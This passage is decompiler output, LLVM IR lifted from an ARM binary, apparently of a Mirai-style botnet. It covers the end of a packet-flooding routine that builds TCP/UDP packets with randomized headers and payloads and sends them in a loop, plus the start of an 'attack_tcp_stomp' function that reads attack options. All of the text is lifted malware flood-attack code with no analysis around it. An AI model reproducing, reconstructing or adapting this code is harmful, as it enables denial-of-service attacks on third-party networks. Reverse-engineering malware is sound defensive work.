  %v1_b100 = trunc i32 %v0_b100 to i16
  %v2_b100 = load i32, i32* @r6, align 4
  %v3_b100 = add i32 %v2_b100, 2
  %v4_b100 = inttoptr i32 %v3_b100 to i16*
  store i16 %v1_b100, i16* %v4_b100, align 2
  %v0_b104 = load i32, i32* @r4, align 4
  store i32 %v0_b104, i32* %stack_var_-44, align 4
  %v5_b108 = icmp slt i32 %v1_b0ec, %arg2
  br i1 %v5_b108, label %dec_label_pc_afc4, label %dec_label_pc_b10c.preheader

dec_label_pc_b10c.preheader:                      ; preds = %bb82, %dec_label_pc_aedc
  %v1_b128 = add i32 %v5_ae2c, 8
  %v1_b12c = add i32 %v5_ae2c, 52
  %v2_b138 = icmp eq i32 %v5_ae80, -1
  %v7_b138 = icmp eq i32 %v5_ae80, -1
  %v2_b31c = icmp eq i32 %v1_aef8, 0
  %v2_b338 = icmp eq i32 %v1_ae4c, 0
  br label %dec_label_pc_b10c

dec_label_pc_b10c:                                ; preds = %dec_label_pc_b10c.preheader, %dec_label_pc_b364
  store i32 %arg2, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 %v2_af04, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_af04, label %dec_label_pc_b364, label %dec_label_pc_b120

dec_label_pc_b120:                                ; preds = %dec_label_pc_b10c
  store i32 %v5_ae2c, i32* %lr.global-to-local, align 4
  store i32 %v1_b128, i32* @sb, align 4
  store i32 %v1_b12c, i32* @r8, align 4
  br label %dec_label_pc_b238

dec_label_pc_b134:                                ; preds = %dec_label_pc_b238
  store i32 %v5_ae80, i32* %r2.global-to-local, align 4
  store i1 %v7_b138, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_b138, label %dec_label_pc_b2c0, label %dec_label_pc_b140

dec_label_pc_b140:                                ; preds = %dec_label_pc_b260, %dec_label_pc_b134
  store i32 65535, i32* @r4, align 4
  %v0_b148 = load i32, i32* @fp, align 4
  %v9_b148 = icmp eq i32 %v0_b148, 65535
  store i1 %v9_b148, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_b148, label %dec_label_pc_b2d8, label %dec_label_pc_b150

dec_label_pc_b150:                                ; preds = %dec_label_pc_b2c0.dec_label_pc_b150_crit_edge, %dec_label_pc_b140
  %v1_b154 = phi i32 [ %v1_b154.pre, %dec_label_pc_b2c0.dec_label_pc_b150_crit_edge ], [ 65535, %dec_label_pc_b140 ]
  store i32 %v3_aefc, i32* %r3.global-to-local, align 4
  %v9_b154 = icmp eq i32 %v3_aefc, %v1_b154
  store i1 %v9_b154, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_b154, label %dec_label_pc_b300, label %dec_label_pc_b15c

dec_label_pc_b15c:                                ; preds = %dec_label_pc_b2d8, %dec_label_pc_b150
  %v1_b160 = phi i32 [ %v1_b2f8, %dec_label_pc_b2d8 ], [ %v1_b154, %dec_label_pc_b150 ]
  store i32 %v3_af00, i32* %ip.global-to-local, align 4
  %v9_b160 = icmp eq i32 %v3_af00, %v1_b160
  store i1 %v9_b160, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_b160, label %dec_label_pc_b314, label %dec_label_pc_b168

dec_label_pc_b168:                                ; preds = %dec_label_pc_b300, %dec_label_pc_b15c
  store i32 %v1_aef8, i32* @lr, align 4
  store i1 %v2_b31c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_b31c, label %dec_label_pc_b330, label %.thread14

.thread14:                                        ; preds = %dec_label_pc_b168
  %v1_b170 = load i32, i32* @r5, align 4
  %v2_b170 = add i32 %v1_b170, 16
  %v3_b170 = inttoptr i32 %v2_b170 to i32*
  %v4_b170 = load i32, i32* %v3_b170, align 4
  store i32 %v4_b170, i32* %r3.global-to-local, align 4
  %v2_b174 = load i32, i32* @r6, align 4
  %v3_b174 = add i32 %v2_b174, 16
  %v4_b174 = inttoptr i32 %v3_b174 to i32*
  store i32 %v4_b170, i32* %v4_b174, align 4
  br label %dec_label_pc_b17c

dec_label_pc_b17c:                                ; preds = %bb85, %.thread14
  store i32 %v1_ae4c, i32* %r1.global-to-local, align 4
  store i1 %v2_b338, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_b338, label %dec_label_pc_b188, label %dec_label_pc_b344

dec_label_pc_b188:                                ; preds = %dec_label_pc_b17c, %dec_label_pc_b330, %dec_label_pc_b344
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_b18c = load i32, i32* @r5, align 4
  %v3_b18c = add i32 %v2_b18c, 10
  %v4_b18c = inttoptr i32 %v3_b18c to i16*
  store i16 0, i16* %v4_b18c, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_b194 = load i32, i32* @r5, align 4
  store i32 %v0_b194, i32* @r0, align 4
  %v2_b198 = call i32 @checksum_generic(i32 %v0_b194, i32 20)
  %v3_b198 = trunc i32 %v2_b198 to i16
  store i32 0, i32* %ip.global-to-local, align 4
  %v3_b1a0 = load i32, i32* @r5, align 4
  %v4_b1a0 = add i32 %v3_b1a0, 10
  %v5_b1a0 = inttoptr i32 %v4_b1a0 to i16*
  store i16 %v3_b198, i16* %v5_b1a0, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_b1a8 = load i32, i32* %ip.global-to-local, align 4
  %v1_b1a8 = trunc i32 %v0_b1a8 to i16
  %v2_b1a8 = load i32, i32* @r6, align 4
  %v3_b1a8 = add i32 %v2_b1a8, 10
  %v4_b1a8 = inttoptr i32 %v3_b1a8 to i16*
  store i16 %v1_b1a8, i16* %v4_b1a8, align 2
  %v0_b1ac = load i32, i32* @r6, align 4
  store i32 %v0_b1ac, i32* @r0, align 4
  %v2_b1b0 = call i32 @checksum_generic(i32 %v0_b1ac, i32 20)
  %v3_b1b0 = trunc i32 %v2_b1b0 to i16
  %v3_b1b4 = load i32, i32* @r6, align 4
  %v4_b1b4 = add i32 %v3_b1b4, 10
  %v5_b1b4 = inttoptr i32 %v4_b1b4 to i16*
  store i16 %v3_b1b0, i16* %v5_b1b4, align 2
  %v2_b1bc = load i32, i32* @r7, align 4
  %v3_b1bc = add i32 %v2_b1bc, 6
  %v4_b1bc = inttoptr i32 %v3_b1bc to i16*
  store i16 0, i16* %v4_b1bc, align 2
  %v0_b1c0 = load i32, i32* @r7, align 4
  store i32 %v0_b1c0, i32* @r1, align 4
  %v1_b1c4 = add i32 %v0_b1c0, 4
  %v2_b1c4 = inttoptr i32 %v1_b1c4 to i16*
  %v3_b1c4 = load i16, i16* %v2_b1c4, align 2
  %v4_b1c4 = zext i16 %v3_b1c4 to i32
  store i32 %v4_b1c4, i32* %r2.global-to-local, align 4
  %v0_b1c8 = load i32, i32* @sb, align 4
  store i32 %v0_b1c8, i32* %r3.global-to-local, align 4
  %v0_b1cc = load i32, i32* @r6, align 4
  %v4_b1d0 = call i32 @checksum_tcpudp(i32 %v0_b1cc, i32 %v0_b1c0, i32 %v4_b1c4, i32 %v0_b1c8)
  %v5_b1d0 = trunc i32 %v4_b1d0 to i16
  %v3_b1d4 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_b1d4, i32* %r2.global-to-local, align 4
  %v3_b1d8 = mul i32 %v3_b1d4, 32
  store i32 %v3_b1d8, i32* %r3.global-to-local, align 4
  %v0_b1dc = load i32, i32* @r5, align 4
  %v1_b1dc = add i32 %v0_b1dc, 16
  %v2_b1dc = inttoptr i32 %v1_b1dc to i32*
  %v3_b1dc = load i32, i32* %v2_b1dc, align 4
  %v5_b1e0 = mul i32 %v3_b1d4, 24
  store i32 %v5_b1e0, i32* %r3.global-to-local, align 4
  %v1_b1e4 = load i32, i32* @sl, align 4
  %v2_b1e4 = add i32 %v1_b1e4, %v5_b1e0
  store i32 %v2_b1e4, i32* @lr, align 4
  %v2_b1e8 = add i32 %v2_b1e4, 4
  %v3_b1e8 = inttoptr i32 %v2_b1e8 to i32*
  store i32 %v3_b1dc, i32* %v3_b1e8, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r1.global-to-local, align 4
  %v3_b1f4 = load i32, i32* @r7, align 4
  %v4_b1f4 = add i32 %v3_b1f4, 6
  %v5_b1f4 = inttoptr i32 %v4_b1f4 to i16*
  store i16 %v5_b1d0, i16* %v5_b1f4, align 2
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_b1fc = load i32, i32* %r1.global-to-local, align 4
  %v1_b1fc = trunc i32 %v0_b1fc to i16
  %v2_b1fc = load i32, i32* %r3.global-to-local, align 4
  %v3_b1fc = load i32, i32* @sl, align 4
  %v4_b1fc = add i32 %v3_b1fc, %v2_b1fc
  %v5_b1fc = inttoptr i32 %v4_b1fc to i16*
  store i16 %v1_b1fc, i16* %v5_b1fc, align 2
  %v0_b200 = load i32, i32* %r2.global-to-local, align 4
  %v1_b200 = trunc i32 %v0_b200 to i16
  %v2_b200 = load i32, i32* @lr, align 4
  %v3_b200 = add i32 %v2_b200, 2
  %v4_b200 = inttoptr i32 %v3_b200 to i16*
  store i16 %v1_b200, i16* %v4_b200, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_b208 = load i32, i32* @r5, align 4
  store i32 %v0_b208, i32* %r1.global-to-local, align 4
  %v0_b210 = load i32, i32* @r8, align 4
  store i32 %v0_b210, i32* %r2.global-to-local, align 4
  %v0_b214 = load i32, i32* @lr, align 4
  %v0_b218 = load i32, i32* %ip.global-to-local, align 4
  %v6_b21c = call i32 @__libc_sendto(i32 %v3_aea4, i32 %v0_b208, i32 %v0_b210, i32 16384, i32 %v0_b214, i32 %v0_b218)
  %v3_b220 = load i32, i32* %stack_var_-44, align 4
  %v1_b224 = add i32 %v3_b220, 1
  store i32 %arg2, i32* %r3.global-to-local, align 4
  %v9_b22c = icmp eq i32 %v1_b224, %arg2
  store i1 %v9_b22c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_b224, i32* %stack_var_-44, align 4
  %v6_b234 = icmp slt i32 %v1_b224, %arg2
  br i1 %v6_b234, label %dec_label_pc_b238, label %dec_label_pc_b364

dec_label_pc_b238:                                ; preds = %dec_label_pc_b188, %dec_label_pc_b120
  %v1_b24c = phi i32 [ %v1_b224, %dec_label_pc_b188 ], [ 0, %dec_label_pc_b120 ]
  %v5_b23c = mul i32 %v1_b24c, 24
  %v1_b240 = load i32, i32* @sl, align 4
  %v2_b240 = add i32 %v1_b240, %v5_b23c
  store i32 %v2_b240, i32* %r3.global-to-local, align 4
  store i32 %v2_ad60, i32* %r1.global-to-local, align 4
  %v1_b248 = add i32 %v2_b240, 20
  %v2_b248 = inttoptr i32 %v1_b248 to i8*
  %v3_b248 = load i8, i8* %v2_b248, align 1
  %v4_b248 = zext i8 %v3_b248 to i32
  store i32 %v4_b248, i32* %r2.global-to-local, align 4
  %v4_b24c = mul i32 %v1_b24c, 4
  %v5_b24c = add i32 %v4_b24c, %v2_ad60
  %v6_b24c = inttoptr i32 %v5_b24c to i32*
  %v7_b24c = load i32, i32* %v6_b24c, align 4
  store i32 %v7_b24c, i32* @r5, align 4
  %v2_b250 = icmp ugt i8 %v3_b248, 30
  %v7_b250 = icmp eq i8 %v3_b248, 31
  store i1 %v7_b250, i1* %cpsr_z.global-to-local, align 1
  %v1_b254 = add i32 %v7_b24c, 24
  store i32 %v1_b254, i32* @r6, align 4
  %v1_b258 = add i32 %v7_b24c, 44
  store i32 %v1_b258, i32* @r7, align 4
  %v2_b25c = xor i1 %v7_b250, true
  %v3_b25c = and i1 %v2_b250, %v2_b25c
  br i1 %v3_b25c, label %dec_label_pc_b134, label %dec_label_pc_b260

dec_label_pc_b260:                                ; preds = %dec_label_pc_b238
  %v1_b260 = add i32 %v2_b240, 16
  %v2_b260 = inttoptr i32 %v1_b260 to i32*
  %v3_b260 = load i32, i32* %v2_b260, align 4
  store i32 %v3_b260, i32* %r4.global-to-local, align 4
  %v0_b264 = call i32 @rand_next()
  %v3_b268 = load i32, i32* %stack_var_-44, align 4
  %v5_b270 = mul i32 %v3_b268, 24
  %v1_b274 = and i32 %v3_b260, 16711680
  store i32 %v1_b274, i32* %ip.global-to-local, align 4
  %v3_b278 = udiv i32 %v3_b260, 16777216
  %v4_b27c = udiv i32 %v1_b274, 256
  %v5_b27c = or i32 %v4_b27c, %v3_b278
  store i32 %v5_b27c, i32* %r2.global-to-local, align 4
  %v1_b280 = load i32, i32* @sl, align 4
  %v2_b280 = add i32 %v1_b280, %v5_b270
  store i32 %v2_b280, i32* %r1.global-to-local, align 4
  %v1_b284 = and i32 %v3_b260, 65280
  store i32 %v1_b284, i32* %r3.global-to-local, align 4
  %v1_b288 = add i32 %v2_b280, 20
  %v2_b288 = inttoptr i32 %v1_b288 to i8*
  %v3_b288 = load i8, i8* %v2_b288, align 1
  %v4_b288 = zext i8 %v3_b288 to i32
  store i32 %v4_b288, i32* %ip.global-to-local, align 4
  %v5_b290 = call i32 @llvm.bswap.i32(i32 %v3_b260)
  %v7_b294 = lshr i32 %v0_b264, %v4_b288
  %v8_b294 = add i32 %v7_b294, %v5_b290
  %v1_b2a0 = and i32 %v8_b294, 65280
  store i32 %v1_b2a0, i32* %r1.global-to-local, align 4
  %v5_b2ac = call i32 @llvm.bswap.i32(i32 %v8_b294)
  store i32 %v5_b2ac, i32* %r3.global-to-local, align 4
  store i32 %v5_ae80, i32* %r2.global-to-local, align 4
  store i1 %v7_b138, i1* %cpsr_z.global-to-local, align 1
  %v1_b2b8 = load i32, i32* @r5, align 4
  %v2_b2b8 = add i32 %v1_b2b8, 16
  %v3_b2b8 = inttoptr i32 %v2_b2b8 to i32*
  store i32 %v5_b2ac, i32* %v3_b2b8, align 4
  br i1 %v2_b138, label %dec_label_pc_b2c0, label %dec_label_pc_b140

dec_label_pc_b2c0:                                ; preds = %dec_label_pc_b260, %dec_label_pc_b134
  %v0_b2c0 = call i32 @rand_next()
  store i32 65535, i32* @r4, align 4
  %v0_b2cc = load i32, i32* @fp, align 4
  %v9_b2cc = icmp eq i32 %v0_b2cc, 65535
  store i1 %v9_b2cc, i1* %cpsr_z.global-to-local, align 1
  %v1_b2d0 = load i32, i32* @r5, align 4
  %v2_b2d0 = add i32 %v1_b2d0, 12
  %v3_b2d0 = inttoptr i32 %v2_b2d0 to i32*
  store i32 %v0_b2c0, i32* %v3_b2d0, align 4
  br i1 %v9_b2cc, label %dec_label_pc_b2d8, label %dec_label_pc_b2c0.dec_label_pc_b150_crit_edge

dec_label_pc_b2c0.dec_label_pc_b150_crit_edge:    ; preds = %dec_label_pc_b2c0
  %v1_b154.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_b150

dec_label_pc_b2d8:                                ; preds = %dec_label_pc_b2c0, %dec_label_pc_b140
  %v0_b2d8 = call i32 @rand_next()
  %v3_b2e0 = urem i32 %v0_b2d8, 65536
  %v1_b2e8 = sub nsw i32 999, %v3_b2e0
  store i32 %v1_b2e8, i32* %r3.global-to-local, align 4
  %v1_b2ec = trunc i32 %v0_b2d8 to i16
  %v2_b2ec = load i32, i32* @r5, align 4
  %v3_b2ec = add i32 %v2_b2ec, 4
  %v4_b2ec = inttoptr i32 %v3_b2ec to i16*
  store i16 %v1_b2ec, i16* %v4_b2ec, align 2
  %v0_b2f0 = load i32, i32* %r3.global-to-local, align 4
  %v1_b2f0 = trunc i32 %v0_b2f0 to i16
  %v2_b2f0 = load i32, i32* @r6, align 4
  %v3_b2f0 = add i32 %v2_b2f0, 4
  %v4_b2f0 = inttoptr i32 %v3_b2f0 to i16*
  store i16 %v1_b2f0, i16* %v4_b2f0, align 2
  store i32 %v3_aefc, i32* %r3.global-to-local, align 4
  %v1_b2f8 = load i32, i32* @r4, align 4
  %v9_b2f8 = icmp eq i32 %v3_aefc, %v1_b2f8
  store i1 %v9_b2f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_b2f8, label %dec_label_pc_b300, label %dec_label_pc_b15c

dec_label_pc_b300:                                ; preds = %dec_label_pc_b2d8, %dec_label_pc_b150
  %v0_b300 = call i32 @rand_next()
  %v1_b300 = trunc i32 %v0_b300 to i16
  store i32 %v3_af00, i32* %ip.global-to-local, align 4
  %v1_b308 = load i32, i32* @r4, align 4
  %v9_b308 = icmp eq i32 %v3_af00, %v1_b308
  store i1 %v9_b308, i1* %cpsr_z.global-to-local, align 1
  %v3_b30c = load i32, i32* @r5, align 4
  %v4_b30c = add i32 %v3_b30c, 44
  %v5_b30c = inttoptr i32 %v4_b30c to i16*
  store i16 %v1_b300, i16* %v5_b30c, align 2
  br i1 %v9_b308, label %dec_label_pc_b314, label %dec_label_pc_b168

dec_label_pc_b314:                                ; preds = %dec_label_pc_b300, %dec_label_pc_b15c
  %v0_b314 = call i32 @rand_next()
  %v1_b314 = trunc i32 %v0_b314 to i16
  store i32 %v1_aef8, i32* @lr, align 4
  store i1 %v2_b31c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_b31c, label %.thread29, label %bb85

.thread29:                                        ; preds = %dec_label_pc_b314
  %v3_b32430 = load i32, i32* @r7, align 4
  %v4_b32431 = add i32 %v3_b32430, 2
  %v5_b32432 = inttoptr i32 %v4_b32431 to i16*
  store i16 %v1_b314, i16* %v5_b32432, align 2
  br label %dec_label_pc_b330

bb85:                                             ; preds = %dec_label_pc_b314
  %v1_b320 = load i32, i32* @r5, align 4
  %v2_b320 = add i32 %v1_b320, 16
  %v3_b320 = inttoptr i32 %v2_b320 to i32*
  %v4_b320 = load i32, i32* %v3_b320, align 4
  store i32 %v4_b320, i32* %r3.global-to-local, align 4
  %v3_b324 = load i32, i32* @r7, align 4
  %v4_b324 = add i32 %v3_b324, 2
  %v5_b324 = inttoptr i32 %v4_b324 to i16*
  store i16 %v1_b314, i16* %v5_b324, align 2
  %v1_b328 = load i32, i32* %r3.global-to-local, align 4
  %v2_b328 = load i32, i32* @r6, align 4
  %v3_b328 = add i32 %v2_b328, 16
  %v4_b328 = inttoptr i32 %v3_b328 to i32*
  store i32 %v1_b328, i32* %v4_b328, align 4
  br label %dec_label_pc_b17c

dec_label_pc_b330:                                ; preds = %.thread29, %dec_label_pc_b168
  %v0_b330 = call i32 @rand_next()
  store i32 %v1_ae4c, i32* %r1.global-to-local, align 4
  store i1 %v2_b338, i1* %cpsr_z.global-to-local, align 1
  %v1_b33c = load i32, i32* @r6, align 4
  %v2_b33c = add i32 %v1_b33c, 16
  %v3_b33c = inttoptr i32 %v2_b33c to i32*
  store i32 %v0_b330, i32* %v3_b33c, align 4
  br i1 %v2_b338, label %dec_label_pc_b188, label %dec_label_pc_b344

dec_label_pc_b344:                                ; preds = %dec_label_pc_b17c, %dec_label_pc_b330
  %v0_b344 = load i32, i32* @r7, align 4
  %v1_b344 = add i32 %v0_b344, 8
  store i32 %v1_b344, i32* @r4, align 4
  store i32 %v5_ae2c, i32* %r1.global-to-local, align 4
  %v2_b350 = call i32 @rand_alphastr(i32 %v1_b344, i32 %v5_ae2c)
  store i32 %v5_ae2c, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_b35c = load i32, i32* @r4, align 4
  %v4_b35c = add i32 %v2_b35c, %v5_ae2c
  %v5_b35c = inttoptr i32 %v4_b35c to i8*
  store i8 0, i8* %v5_b35c, align 1
  br label %dec_label_pc_b188

dec_label_pc_b364:                                ; preds = %dec_label_pc_b188, %dec_label_pc_b10c
  %v2_b368 = call i32 @__GI_time(i32* null)
  store i32 %v2_ae90, i32* %ip.global-to-local, align 4
  %v9_b370 = icmp eq i32 %v2_ae90, %v2_b368
  store i1 %v9_b370, i1* %cpsr_z.global-to-local, align 1
  %v6_b374 = icmp slt i32 %v2_ae90, %v2_b368
  br i1 %v6_b374, label %dec_label_pc_b378, label %dec_label_pc_b10c

dec_label_pc_b378:                                ; preds = %dec_label_pc_b364, %entry, %dec_label_pc_b384
  %v1_b380 = phi i32 [ %v3_aea4, %entry ], [ %v1_b388, %dec_label_pc_b384 ], [ %v2_b368, %dec_label_pc_b364 ]
  store i32 %v3_ad34, i32* %r4.global-to-local, align 4
  store i32 %v24_ad34, i32* %fp.global-to-local, align 4
  store i32 %v27_ad34, i32* %lr.global-to-local, align 4
  ret i32 %v1_b380

dec_label_pc_b384:                                ; preds = %dec_label_pc_aeb4
  %v1_b388 = call i32 @__GI___libc_close(i32 %v3_aea4)
  br label %dec_label_pc_b378

; uselistorder directives
  uselistorder i16 %v1_b314, { 1, 0 }
  uselistorder i32 %v1_b2f8, { 1, 0 }
  uselistorder i32 %v0_b2d8, { 1, 0 }
  uselistorder i32 %v5_b2ac, { 1, 0 }
  uselistorder i32 %v3_b260, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v7_b24c, { 1, 0, 2 }
  uselistorder i32 %v1_b224, { 1, 2, 0, 3 }
  uselistorder i32 %v3_b1d4, { 1, 0, 2 }
  uselistorder i1 %v2_b338, { 2, 3, 1, 0 }
  uselistorder i1 %v2_b31c, { 2, 3, 1, 0 }
  uselistorder i1 %v7_b138, { 2, 1, 0 }
  uselistorder i32 %v0_b0b8, { 1, 0 }
  uselistorder i32 %v1_af40, { 1, 0 }
  uselistorder i32 %v3_af2c, { 2, 1, 0 }
  uselistorder i1 %v2_af04, { 1, 0, 2, 3 }
  uselistorder i32 %v1_aef8, { 4, 3, 5, 1, 2, 0 }
  uselistorder i32 %v3_aef4, { 1, 0 }
  uselistorder i32 %v0_aef0, { 1, 0, 2, 3 }
  uselistorder i32 %v0_aedc, { 2, 0, 1, 3 }
  uselistorder i1 %v7_aed4, { 1, 0 }
  uselistorder i1 %v7_aea8, { 1, 0 }
  uselistorder i32 %v3_aea4, { 3, 1, 4, 2, 0 }
  uselistorder i32 %v2_ae90, { 2, 1, 0 }
  uselistorder i32 %v5_ae80, { 3, 4, 0, 5, 1, 2 }
  uselistorder i32 %v1_ae4c, { 2, 1, 3, 0 }
  uselistorder i32 %v5_ae2c, { 1, 4, 3, 2, 5, 7, 6, 0 }
  uselistorder i32 %v1_ade0, { 1, 0 }
  uselistorder i32 %v1_adbc, { 2, 1, 0 }
  uselistorder i32 %v6_adb4, { 1, 0 }
  uselistorder i32 %v7_ad9c, { 1, 0, 4, 3, 2 }
  uselistorder i8 %v5_ad98, { 0, 2, 1 }
  uselistorder i32 %v6_ad78, { 1, 0 }
  uselistorder i32 %v2_ad60, { 0, 3, 1, 2 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 11, 9, 10 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 2, 3, 4, 5, 15, 6, 7, 8, 9, 10, 11, 12, 13, 14, 16 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 18, 9, 10, 11, 12, 13, 14, 15, 16, 17, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 10, 4, 5, 6, 7, 8, 9, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 29, 28, 30, 31, 32, 33, 34, 35, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 11, 5, 6, 7, 8, 9, 10, 12, 13, 14, 15, 16, 17, 18, 20, 19, 21, 22, 23, 24, 25, 27, 26, 28, 29, 31, 30, 33, 32, 0 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 11, 10, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 14, 7, 8, 9, 10, 11, 12, 13, 15, 16, 17, 18, 19, 20, 21, 22, 23 }
  uselistorder i8 47, { 4, 5, 0, 1, 2, 3, 6, 7, 8, 9 }
  uselistorder i32 %arg2, { 6, 5, 4, 7, 1, 0, 3, 2, 8, 9, 10 }
  uselistorder label %dec_label_pc_b378, { 2, 0, 1 }
  uselistorder label %dec_label_pc_b344, { 1, 0 }
  uselistorder label %dec_label_pc_b188, { 2, 1, 0 }
  uselistorder label %dec_label_pc_b10c, { 1, 0 }
  uselistorder label %bb82, { 1, 0 }
  uselistorder label %bb81, { 1, 0 }
  uselistorder label %bb79, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @attack_tcp_stomp(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp32 = call i8 @__decompiler_undefined_function_4()
  %tmp33 = call i16 @__decompiler_undefined_function_1()
  %tmp34 = call i32 @__decompiler_undefined_function_0()
  %tmp36 = call i32 @__decompiler_undefined_function_0()
  %tmp62 = call i16 @__decompiler_undefined_function_1()
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-336 = alloca i32, align 4
  %stack_var_-80 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-160 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_b394 = load i32, i32* @r4, align 4
  %v27_b394 = load i32, i32* @lr, align 4
  store i32 0, i32* @r7, align 4
  store i32 %arg1, i32* @r6, align 4
  store i32 16, i32* %r1.global-to-local, align 4
  store i32 %arg2, i32* %r0.global-to-local, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg5, i32* @r4, align 4
  store i32 %arg3, i32* @fp, align 4
  store i32 0, i32* %stack_var_-44, align 4
  %v2_b3c0 = call i32 @calloc(i32 %arg2, i32 16)
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg2, i32* %r0.global-to-local, align 4
  %v2_b3d0 = call i32 @calloc(i32 %arg2, i32 4)
  %v0_b3d4 = load i32, i32* @r4, align 4
  store i32 %v0_b3d4, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_b3e0 = load i32, i32* @r7, align 4
  store i32 %v0_b3e0, i32* %r3.global-to-local, align 4
  %v0_b3e4 = load i32, i32* @r5, align 4
  store i32 %v0_b3e4, i32* %r0.global-to-local, align 4
  %v5_b3e8 = inttoptr i32 %v0_b3d4 to i32*
  %v6_b3e8 = call i32 @attack_get_opt_int(i32 %v0_b3e4, i32* %v5_b3e8, i32 2, i32 %v0_b3e0)
  %v1_b3f4 = urem i32 %v6_b3e8, 256
  store i32 %v1_b3f4, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_b400 = load i32, i32* @r4, align 4
  store i32 %v0_b400, i32* %r1.global-to-local, align 4
  %v0_b404 = load i32, i32* @r5, align 4
  store i32 %v0_b404, i32* %r0.global-to-local, align 4
  %v5_b408 = trunc i32 %v6_b3e8 to i8
  %v6_b40c = inttoptr i32 %v0_b400 to i32*
  %v7_b40c = call i32 @attack_get_opt_int(i32 %v0_b404, i32* %v6_b40c, i32 3, i32 65535)
  %v0_b410 = load i32, i32* @r4, align 4
  store i32 %v0_b410, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_b40c, i32* @r8, align 4
  %v0_b420 = load i32, i32* @r5, align 4
  store i32 %v0_b420, i32* %r0.global-to-local, align 4
  %v4_b424 = inttoptr i32 %v0_b410 to i32*
  %v5_b424 = call i32 @attack_get_opt_int(i32 %v0_b420, i32* %v4_b424, i32 4, i32 64)
  %v1_b42c = urem i32 %v5_b424, 256
  store i32 %v1_b42c, i32* %ip.global-to-local, align 4
  %v0_b430 = load i32, i32* @r4, align 4
  store i32 %v0_b430, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_b43c = load i32, i32* @r5, align 4
  store i32 %v0_b43c, i32* %r0.global-to-local, align 4
  %v5_b440 = trunc i32 %v5_b424 to i8
  %v6_b444 = inttoptr i32 %v0_b430 to i32*
  %v7_b444 = call i32 @attack_get_opt_int(i32 %v0_b43c, i32* %v6_b444, i32 5, i32 1)
  %v1_b450 = urem i32 %v7_b444, 256
  store i32 %v1_b450, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  %v0_b458 = load i32, i32* @r4, align 4
  store i32 %v0_b458, i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v0_b460 = load i32, i32* @r5, align 4
  store i32 %v0_b460, i32* %r0.global-to-local, align 4
  %v5_b468 = inttoptr i32 %v0_b458 to i32*
  %v6_b468 = call i32 @attack_get_opt_int(i32 %v0_b460, i32* %v5_b468, i32 7, i32 65535)
  %v0_b46c = load i32, i32* @r4, align 4
  store i32 %v0_b46c, i32* %r1.global-to-local, align 4
  %v3_b470 = mul i32 %v6_b468, 65536
  store i32 %v3_b470, i32* %ip.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  %v0_b478 = load i32, i32* @r7, align 4
  store i32 %v0_b478, i32* %r3.global-to-local, align 4
  %v0_b47c = load i32, i32* @r5, align 4
  store i32 %v0_b47c, i32* %r0.global-to-local, align 4
